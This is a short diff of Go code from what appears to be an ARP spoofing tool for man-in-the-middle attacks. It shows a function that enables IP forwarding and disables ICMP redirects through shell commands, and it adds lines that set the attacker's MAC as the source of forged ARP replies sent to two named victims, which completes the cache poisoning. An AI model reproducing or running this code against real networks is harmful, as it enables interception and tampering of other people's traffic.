@@ -60,6 +60,7 @@ func ARPScan(iface string, targetIP string) (string, error) {
 		time.Sleep(1 * time.Second)
 	}
 }
+
 func enableIPForwarding(iface string) {
 	exec.Command("sh", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward").Run()
 	exec.Command("sh", "-c", fmt.Sprintf("echo 0 > /proc/sys/net/ipv4/conf/%s/send_redirects", iface)).Run()
@@ -147,6 +148,7 @@ func CreateFakeArp(victim1, victim2, macVictim1, macVictim2, srcMac string) ([]b
 	arpPacket1.SetDstIP(victim1)
 	arpPacket1.SetSrcIP(victim2)
 	arpPacket1.SetDstMac(macVictim1)
+	arpPacket1.SetSrcMac(srcMac)
 
 	ethLayer2 := packet.EthernetLayer()
 	ethLayer2.SetDstMAC(macVictim2)
@@ -157,6 +159,7 @@ func CreateFakeArp(victim1, victim2, macVictim1, macVictim2, srcMac string) ([]b
 	arpPacket2.SetDstIP(victim2)
 	arpPacket2.SetSrcIP(victim1)
 	arpPacket2.SetDstMac(macVictim2)
+	arpPacket2.SetSrcMac(srcMac)
 
 	packet1, err := packet.CraftPacket(ethLayer1.Layer(), arpPacket1.Layer())
 	packet2, err := packet.CraftPacket(ethLayer2.Layer(), arpPacket2.Layer())
